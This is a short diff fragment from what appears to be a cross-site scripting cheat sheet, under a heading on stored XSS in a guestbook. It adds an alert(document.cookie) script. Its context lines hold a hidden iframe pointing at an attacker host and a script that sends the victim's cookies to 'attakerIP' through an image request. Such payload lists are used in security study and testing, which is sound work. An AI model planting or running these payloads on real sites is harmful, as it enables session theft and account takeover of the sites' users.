@@ -181,6 +181,7 @@ Ampersand            &foo
 
 Stored - example: guestbook
 <script>alert("XSS");</script>
+<script>alert(document.cookie);</script>
 <iframe SRC="http://attackerIP" height="0" width="0"></iframe>
 <script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
